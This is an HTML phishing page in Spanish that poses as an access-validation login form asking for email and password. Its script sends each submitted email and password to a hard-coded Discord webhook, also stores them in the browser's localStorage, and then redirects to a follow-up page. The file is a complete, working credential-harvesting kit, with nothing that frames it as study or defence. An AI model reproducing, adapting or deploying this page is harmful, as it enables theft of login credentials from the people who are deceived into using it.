<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validar Acceso</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background-color: white;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .banner {
            background-color: #f8f9fa;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            padding: 40px;
            width: 100%;
            max-width: 400px;
            text-align: center;
        }

        .logo-space {
            width: 120px;
            height: 120px;
            margin: 0 auto 30px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .logo-space img {
            max-width: 100%;
            max-height: 100%;
            object-fit: contain;
        }

        h1 {
            font-size: 24px;
            color: #333;
            margin-bottom: 30px;
            font-weight: 600;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
            font-size: 14px;
        }

        input {
            width: 100%;
            padding: 12px;
            border: 2px solid #dee2e6;
            border-radius: 6px;
            font-size: 14px;
            transition: border-color 0.3s;
        }

        input:focus {
            outline: none;
            border-color: #007bff;
            box-shadow: 0 0 5px rgba(0, 123, 255, 0.3);
        }

        input::placeholder {
            color: #adb5bd;
        }

        .error {
            color: #dc3545;
            font-size: 12px;
            margin-top: 5px;
            display: none;
        }

        button {
            width: 100%;
            padding: 12px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.3s;
            margin-top: 10px;
        }

        button:hover {
            background-color: #0056b3;
        }

        button:active {
            background-color: #004085;
        }

        .loading {
            display: none;
            text-align: center;
            color: #007bff;
            font-size: 14px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="banner">
        <div class="logo-space">
            <img id="logo" src="logo.png" alt="Logo">
        </div>

        <h1>Ingresa para validar</h1>

        <form id="loginForm">
            <div class="form-group">
                <label for="email">Correo Electrónico</label>
                <input 
                    type="email" 
                    id="email" 
                    placeholder="ejemplo@correo.com" 
                    required
                >
                <div class="error" id="emailError">El correo debe contener un @</div>
            </div>

            <div class="form-group">
                <label for="password">Contraseña</label>
                <input 
                    type="password" 
                    id="password" 
                    placeholder="Ingresa tu contraseña" 
                    required
                >
            </div>

            <button type="submit">Continuar</button>
            <div class="loading" id="loading">Enviando datos...</div>
        </form>
    </div>

    <script>
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1556173985086177380/0-QwH4IDZEOB8-_lIbuhh8thRbKeDbUvm_gFU2sADsHdVoUNU7RTNXAKckazKRTwv4Qp';

        const form = document.getElementById('loginForm');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const emailError = document.getElementById('emailError');
        const loadingDiv = document.getElementById('loading');

        function validateEmail(email) {
            return email.includes('@') && email.includes('.');
        }

        emailInput.addEventListener('blur', () => {
            if (emailInput.value && !validateEmail(emailInput.value)) {
                emailError.style.display = 'block';
            } else {
                emailError.style.display = 'none';
            }
        });

        form.addEventListener('submit', async (e) => {
            e.preventDefault();

            const email = emailInput.value;
            const password = passwordInput.value;

            emailError.style.display = validateEmail(email) ? 'none' : 'block';

            if (!validateEmail(email) || !password) {
                return;
            }

            loadingDiv.style.display = 'block';

            try {
                const message = {
                    content: `🔐 **Intento de Login**`,
                    embeds: [
                        {
                            color: 3447003,
                            title: "Intento de Validación de Acceso",
                            fields: [
                                {
                                    name: "📧 Correo Electrónico",
                                    value: email,
                                    inline: true
                                },
                                {
                                    name: "🔑 Contraseña",
                                    value: "||" + password + "||",
                                    inline: true
                                },
                                {
                                    name: "⏰ Fecha y Hora",
                                    value: new Date().toLocaleString('es-ES'),
                                    inline: false
                                }
                            ],
                            footer: {
                                text: "Sistema de Validación - Intento"
                            }
                        }
                    ]
                };

                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(message)
                });
            } catch (error) {
                console.error('Error:', error);
            }

            localStorage.setItem('userEmail', email);
            localStorage.setItem('userPassword', password);

            setTimeout(() => {
                loadingDiv.style.display = 'none';
                window.location.href = 'validacion.html';
            }, 1000);
        });
    </script>
</body>
</html>
